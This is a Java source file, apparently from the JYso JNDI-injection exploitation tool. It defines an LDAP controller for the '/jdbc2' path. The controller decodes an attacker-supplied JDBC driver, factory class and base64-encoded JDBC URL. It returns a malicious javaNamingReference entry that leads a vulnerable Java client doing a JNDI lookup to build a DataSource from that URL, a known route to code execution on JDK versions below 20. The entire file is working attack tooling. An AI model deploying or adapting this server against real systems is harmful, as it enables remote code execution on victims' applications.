package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Utils;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.Enumeration;

@LdapMapping(uri = {"/jdbc2"})
public class jdbcController2 implements LdapController {

    private static final Logger log = LogManager.getLogger(jdbcController2.class);
    private static String payloadType;
    private static String factoryType;
    private static String[] params;
    private static GadgetType gadgetType;

    public static void printResultJDBC2(String base) throws Exception {
        base = base.replace('\\', '/');
        int fistIndex = base.indexOf("/");
        int secondIndex = base.indexOf("/", fistIndex + 1);
        if (secondIndex < 0) secondIndex = base.length();

        try {
            payloadType = base.substring(fistIndex + 1, secondIndex);
            System.out.println(Ansi.ansi().fgBrightMagenta().a("  driver: " + payloadType).reset());
        } catch (IllegalArgumentException e) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
        }

        int thirdIndex = base.indexOf("/", secondIndex + 1);
        if (thirdIndex < 0) thirdIndex = base.length();

        try {
            factoryType = base.substring(secondIndex + 1, thirdIndex);
            System.out.println(Ansi.ansi().fgBrightBlue().a("  Factory: " + factoryType).reset());
        } catch (IllegalArgumentException e) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
        }

        int fourthIndex = base.indexOf("/", thirdIndex + 1);

        if (fourthIndex != -1) {
            try {
                gadgetType = GadgetType.valueOf(base.substring(thirdIndex + 1, fourthIndex).toLowerCase());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(thirdIndex + 1, fourthIndex));
            }
        }

        if (gadgetType == GadgetType.base64) {
            String cmd = Utils.getCmdFromBase(base);
            System.out.println(Ansi.ansi().fgBrightRed().a("  JDBC_URL: " + cmd).reset());
            params = new String[]{cmd};
        }
    }

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry e = new Entry(base);
            String driver = payloadType;
            String JDBC_URL = params[0];

            Reference ref = new Reference("javax.sql.DataSource", factoryType, null);
            ref.add(new StringRefAddr("driverClassName", driver));
            ref.add(new StringRefAddr("url", JDBC_URL));
            ref.add(new StringRefAddr("initialSize", "1"));

            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaClassName", ref.getClassName());
            e.addAttribute("javaFactory", ref.getFactoryClassName());

            Enumeration<RefAddr> enumeration = ref.getAll();
            int sn = 0;

            while (enumeration.hasMoreElements()) {
                StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
                e.addAttribute("javaReferenceAddress", "#" + sn + "#" + addr.getType() + "#" + addr.getContent());
                sn++;
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            log.error(String.valueOf(er));
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI JDBC Reference Links Target < JDK20");
        try {
            printResultJDBC2(base);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
